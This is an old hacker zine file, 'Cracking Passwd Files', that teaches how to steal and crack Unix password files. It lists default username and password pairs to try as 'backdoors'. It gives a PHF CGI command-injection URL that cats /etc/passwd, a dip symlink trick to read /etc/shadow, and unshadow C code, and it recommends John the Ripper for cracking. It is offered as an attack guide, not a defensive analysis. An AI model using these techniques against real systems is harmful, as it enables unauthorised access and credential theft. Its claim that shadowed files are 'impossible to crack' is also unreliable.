
                       :..::..File 8 Of 11.::..:
                       :.Cracking Passwd Files.:
                       :..::...By Cyborg...::..:

<*> Introduction: This file deals with unix passwd files and how to
obtain and crack them. It is not meant as an ultimate guide. It deals
with many aspects of passwd protection.

*** Starting Off

Most FTP servers have the directory /pub which stores all the 'public'
information for you to download. But alongside /pub you will probably
find other directories such as /bin and /etc its the /etc  directory
which is important. In this directory there is normally a file called
passwd. This looks something like this:

root:7GHgfHgfhG:1127:20:Superuser
jgibson:7fOsTXF2pA1W2:1128:20:Jim,,,,,,,:/usr/people/jgibson:/bin/csh
tvr:EUyd5XAAtv2dA:1129:20:Tovar:/usr/people/tvr:/bin/csh
mcn:t3e.QVzvUC1T.:1130:20:Greatbear,,,,,,,:/usr/people/mcn:/bin/csh
mouse:EUyd5XAAtv2dA:1131:20:Melissa P.:/usr/people/mouse:/bin/csh

This is where all the user names and passwords are kept. For example,
root is the superuser and the rest are normal users on the site. The
bit after the word root or mcn such as in this example (EUyd5XAAtv2dA)
is the password but it is encrypted with the one-way DES encryption
standard. So you use a password cracker. I recommend John The Ripper
because it is the best. You can easily find that by typing it in at a
search engine. Not that a decoy unix password is sometimes stored in
/home/ftp/etc/passwd to mislead people.

*** Obtaining The Passwd File

First of all, the file is stored in /etc/passwd so that is where you
are going to get it from. To get it you need to be able to login to the
the system. The most common way of doing this is through FTP. The
standard FTP port is 21. So load up your favourite FTP program and
connect to the desired server as anonymous login. Now browse into
/etc/passwd where the file is stored. Take note that sometimes the
passwords are stored in /etc/pwd.db

More often than not the server won't allow anonymous logins or places
restrictions on accessing the /etc/passwd directory. In this case try
the following backdoors:

root | root
sys | sys
sys | bin
sys | system 
daemon | daemon 
uucp | uucp 
tty | tty 
test | test 
unix | unix 
bin | bin
adm | adm 
adm | admin 
sysman | sysman 
sysman | sys 
sysadmin | sysadmin 
sysadmin | sys 
sysadmin | system 
sysadmin | admin 
sysadmin | adm 
who | who 
learn | learn 
uuhost | uuhost 
guest | guest
host | host 
nuucp | anon
nuucp | nuucp 
rje | rje
sync | sync
admin | admin
games | games 
games | player 
sysop | sysop 
root | sysop 
demo | demo 
sysbin | sysbin
mountfsys | mountfsys

*** Guide to PHF

The PHF (packet handler function) white pages directory services
program distributed with the NCSA httpd, versions 1.5a and earlier, and
also included in the Apache distribution prior to version 1.0.5, passes
unchecked newline (hex 0a) characters to the Unix shell. The phf phone
book script file in the cgi-bin directory can be exploited to give you
the password (etc/passwd) file in Unix systems.

To use PHF you enter the following command line into any web browser:

http://www.target.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd

This takes you to the /etc/passwd file of the target computer. If you
get a 404 error, file not found then the domain isn't vunerable.
Sometimes you can be logged trying trying PHF queries but in most cases
the domain doesn't report it.

*** Shadowed Passwords

Shadowed password files are where things start to become a little
trickier. This type of passwd file is impossible to crack. The real
encrypted passwords are stored in different files on different systems.
Here is a made-up example of a normal passwd entry:

root:R0rmc6lx78Vwi5I:0:0:root:/root:/bin/bash

Now here is that entry again, only shadowed:

root:x:0:0:root:/root:/bin/bash

You can find the shadowed passwords in these directories according to
their system:

Version               Path                            Token

<*>-----------------------------------------------------------------<*>

AIX 3                 /etc/security/passwd            !
"  "                  /tcb/auth/files//
A/UX 3.0s             /tcb/files/auth/?/*
BSD4.3-Reno           /etc/master.passwd              *
ConvexOS 10           /etc/shadpw                     *
ConvexOS 11           /etc/shadow                     *
DG/UX                 /etc/tcb/aa/user/               *
EP/IX                 /etc/shadow                     x
HP-UX                 /.secure/etc/passwd             *
IRIX 5                /etc/shadow                     x
Linux 1.1             /etc/shadow                     *
OSF/1                 /etc/passwd[.dir|.pag]          *
SCO Unix #.2.x        /tcb/auth/files//
SunOS4.1+c2           /etc/security/passwd.adjunct    ##username
SunOS 5.0             /etc/shadow
System V Release 4.0  /etc/shadow                     x
System V Release 4.2  /etc/security/* database
Ultrix 4              /etc/auth[.dir|.pag]            *
UNICOS                /etc/udb                        *

On some Linux Slackwares you can use dip to exploit root, it can also
be used to get the shadow file.

ln -s /etc/shadow /tmp/dummy.dip /sbin/dip -v /tmp/dummy.dip 

If dip is vulnerable this will show the shadow file. There is another
alternative, you can unshadow the passwd file with the following famous
C source code:

<*>-------------------------< Unshadow.c >--------------------------<*>

#include <pwd.h>

main()
{
  struct passwd *p;
  while(p=getpwent())
  printf("%s:%s:%d:%d:%s:%s:%s\n", p->pw_name, p->pw_passwd,
  p->pw_uid, p->pw_gid, p->pw_gecos, p->pw_dir, p->pw_shell);
}

<*>-------------------------< Unshadow.c >--------------------------<*>

Well I hope this has been an informative read. If you would like to
e-mail me regarding anything in this file then go ahead. If you are
interested in hacking, phreaking or programming then e-mail me or visit
my website:
                          cyborg@disinfo.net
                        http://cyborg.ie.8m.com

                       :..::..End Of File..::..:
